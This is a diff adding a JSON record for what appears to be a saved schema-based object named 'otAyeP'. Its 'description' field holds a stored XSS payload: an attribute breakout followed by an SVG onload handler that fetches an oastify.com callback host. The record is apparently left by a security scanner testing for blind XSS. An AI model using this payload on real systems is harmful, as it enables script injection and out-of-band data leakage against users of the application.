@@ -1,0 +1,33 @@
+{
+	"createdTime":1736639333129,
+	"deleted":false,
+	"description":"'\"><svg/onload=fetch`//j7rro86c3x09dxojcsh7zwpdc4ix6vunkbcy3ms\\.oastify.com`>",
+	"id":"6783036544ce135db1da5bdd",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":854,
+	"lcName":"otayep",
+	"modifiedTime":1736639333129,
+	"name":"otAyeP",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":854,
+	"standard":false,
+	"version":0
+}
